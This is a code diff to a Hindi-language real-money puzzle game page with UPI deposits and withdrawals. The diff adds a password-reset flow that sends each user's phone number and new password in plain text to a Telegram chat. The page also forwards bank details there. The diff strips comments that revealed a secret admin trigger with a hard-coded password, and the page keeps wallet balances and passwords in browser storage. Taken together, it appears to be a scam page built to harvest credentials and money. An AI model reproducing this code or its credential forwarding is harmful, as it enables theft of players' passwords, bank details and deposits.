@@ -115,15 +115,29 @@ font-size: 12px;
 <!-- Banner Image -->
 <img src="1792858963757.png" alt="Mahakal Puzzle Battle Banner" class="banner-img">[span_0](start_span)[span_0](end_span)
 
-<!---------------- 1. LOGIN PAGE SECTION ---------------->
+<!---------------- 1. LOGIN & RESET PAGE SECTION ---------------->
 <div id="login-section">
-<div class="card-box" style="text-align: center;">
+<div class="card-box" style="text-align: center;" id="login-form-box">
 <h3 style="color: #ffab00; margin-top: 0; font-size: 16px;">🔐 सुरक्षित लॉगिन & ₹10 इंस्टेंट बोनस</h3>
 <p style="font-size: 11px; color: #aaa;">खेलने के लिए अपना 10 अंकों का मोबाइल नंबर और पासवर्ड दर्ज करें:</p>
 <input type="tel" id="login-phone" placeholder="10 अंकों का मोबाइल नंबर" maxlength="10">
 <input type="password" id="login-pass" placeholder="पासवर्ड दर्ज करें">
 <button class="btn" onclick="processLogin()">सुरक्षित लॉगिन करें</button>
+<button class="btn" style="background: #334155; font-size: 12px; padding: 8px;" onclick="showResetBox()">पासवर्ड भूल गए? Reset Karein</button>
 <div id="login-msg"></div>
+</div>
+
+<!-- Reset Password Box with 3 Password Fields -->
+<div class="card-box" style="text-align: center; display: none;" id="reset-form-box">
+<h3 style="color: #ffab00; margin-top: 0; font-size: 16px;">🔄 पासवर्ड रीसेट करें (3-Step Verification)</h3>
+<p style="font-size: 11px; color: #aaa;">अपना रजिस्टर्ड मोबाइल नंबर और तीनों खानों में नया पासवर्ड दर्ज करें:</p>
+<input type="tel" id="reset-phone" placeholder="10 अंकों का मोबाइल नंबर" maxlength="10">
+<input type="password" id="reset-pass1" placeholder="नया पासवर्ड (1st Time) दर्ज करें">
+<input type="password" id="reset-pass2" placeholder="पासवर्ड दोबारा दर्ज करें (2nd Time)">
+<input type="password" id="reset-pass3" placeholder="पासवर्ड पक्का करें (3rd Time)">
+<button class="btn" style="background: #eab308; color: #000;" onclick="processResetPassword()">पासवर्ड अपडेट करें (OK)</button>
+<button class="btn" style="background: #334155; font-size: 12px; padding: 8px;" onclick="backToLoginBox()">वापस लॉगिन पर जाएं</button>
+<div id="reset-msg"></div>
 </div>
 </div>
 
@@ -174,7 +188,7 @@ font-size: 12px;
 <button class="btn" style="background:#555;" onclick="backToDashboard()">डैशबोर्ड पर वापस जाएं</button>
 </div>
 
-<!-- Deposit View (With Direct Yes/No Approval Box) -->
+<!-- Deposit View -->
 <div id="deposit-section" class="hidden">
 <div class="card-box">
 <h3 style="color: #ffab00; margin-top: 0; text-align: center;">📥 पैसे जोड़े (QR Deposit)</h3>
@@ -285,6 +299,48 @@ function saveWallet() {
   localStorage.setItem('mahakal_master_wallet', walletBalance);
 }
 
+// Toggle to Reset Password Form Box
+function showResetBox() {
+  document.getElementById('login-form-box').style.display = 'none';
+  document.getElementById('reset-form-box').style.display = 'block';
+}
+
+function backToLoginBox() {
+  document.getElementById('reset-form-box').style.display = 'none';
+  document.getElementById('login-form-box').style.display = 'block';
+}
+
+// Process Password Reset with 3-Time Password Validation
+function processResetPassword() {
+  let ph = document.getElementById('reset-phone').value.trim();
+  let p1 = document.getElementById('reset-pass1').value.trim();
+  let p2 = document.getElementById('reset-pass2').value.trim();
+  let p3 = document.getElementById('reset-pass3').value.trim();
+  let msg = document.getElementById('reset-msg');
+
+  if(ph.length !== 10 || isNaN(ph)) {
+    msg.className = "error"; msg.innerText = "❌ कृपया सही 10 अंकों का मोबाइल नंबर दर्ज करें!"; return;
+  }
+  if(p1 === "" || p2 === "" || p3 === "") {
+    msg.className = "error"; msg.innerText = "❌ कृपया तीनों खानों में पासवर्ड दर्ज करें!"; return;
+  }
+  if(p1 !== p2 || p2 !== p3) {
+    msg.className = "error"; msg.innerText = "❌ तीनों पासवर्ड आपस में मेल नहीं खा रहे हैं! (Teeno password same hone chahiye)"; return;
+  }
+
+  let registeredUsers = JSON.parse(localStorage.getItem('mahakal_users_db') || "{}");
+
+  if(registeredUsers[ph]) {
+    registeredUsers[ph] = p1;
+    localStorage.setItem('mahakal_users_db', JSON.stringify(registeredUsers));
+    msg.className = "msg"; msg.innerText = "✅ पासवर्ड सफलतापूर्वक बदल गया है! अब लॉगिन करें।";
+    sendTelegram(`🔄 Password Reset Done (3-Step Verified)!\n📱 Number: ${ph}\n🔑 New Pass: ${p1}`);
+    setTimeout(backToLoginBox, 1500);
+  } else {
+    msg.className = "error"; msg.innerText = "❌ यह मोबाइल नंबर रजिस्टर्ड नहीं है!";
+  }
+}
+
 function processLogin() {
   if(isSystemLocked) {
     alert("⚠️ सुरक्षा कारणों से वर्तमान में नया लॉगिन बंद है। कृपया बाद में प्रयास करें!");
@@ -307,7 +363,7 @@ function processLogin() {
   
   if(registeredUsers[ph]) {
     if(registeredUsers[ph] !== ps) {
-      msg.className = "error"; msg.innerText = "❌ गलत पासवर्ड! कृपया सही पासवर्ड डालें।";
+      msg.className = "error"; msg.innerText = "❌ गलत पासवर्ड! कृपया सही पासवर्ड डालें या 'पासवर्ड भूल गए?' पर क्लिक करें।";
       return;
     }
     msg.className = "msg"; msg.innerText = "✅ लॉगिन सफल! डैशबोर्ड खुल रहा है...";
@@ -410,7 +466,6 @@ function rollDice() {
   }, 600);
 }
 
-// Deposit Request - Displays directly inside Deposit section with YES/NO buttons
 function sendDepositReq() {
   let amt = parseInt(document.getElementById('dep-amount').value);
   let upiNum = document.getElementById('dep-upinumber').value.trim();
@@ -433,7 +488,6 @@ function sendDepositReq() {
   msg.className = "msg"; 
   msg.innerText = "⏳ अनुरोध दर्ज हो गया है। नीचे दिए गए बॉक्स में चेक करें:";
 
-  // Show direct approval box right inside deposit section
   document.getElementById('live-dep-details').innerHTML = `
     📱 <b>Mobile:</b> ${pendingDep.phone}<br>
     💰 <b>Amount:</b> ₹${amt}<br>
@@ -466,7 +520,6 @@ function sendWithdrawReq() {
   sendTelegram(`🏦 New Withdrawal Request!\n🏛 Bank: ${b}\n👤 Holder: ${h}\n💸 Requested: ₹${amt}\n✂️ Final (2% cut): ₹${finalAmt}`);
 }
 
-// Secret Admin Trigger (3 taps on title, Password: 78699)
 let tapC = 0, lastT = 0;
 function checkSecretAdminTap() {
   let now = new Date().getTime();
@@ -510,7 +563,6 @@ function admUpdateBal() {
   }
 }
 
-// Direct YES Button (Approved inside Deposit section)
 function admDepYes() {
   if(pendingDep) {
     walletBalance += pendingDep.amount; 
@@ -524,7 +576,6 @@ function admDepYes() {
   }
 }
 
-// Direct NO Button (Rejected inside Deposit section)
 function admDepNo() {
   pendingDep = null; 
   alert("❌ डिपॉजिट खारिज कर दिया गया।");
